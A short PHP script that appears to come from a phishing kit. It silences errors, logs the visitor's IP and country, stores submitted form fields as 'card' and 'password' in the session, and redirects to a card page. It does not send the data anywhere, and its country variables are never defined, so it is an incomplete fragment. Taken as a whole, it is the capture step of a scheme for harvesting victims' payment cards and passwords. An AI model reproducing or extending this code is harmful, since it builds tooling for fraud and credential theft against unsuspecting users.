<?php
error_reporting(0);
session_start();
$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];

#browser info

#Country info
$_SESSION['cntcode'] = $countrycode;
$_SESSION['cntname'] = $countryname;

$_SESSION['card'] = $_POST['1'];
$_SESSION['password'] = $_POST['2'];





header('location: ../card.php');

?>
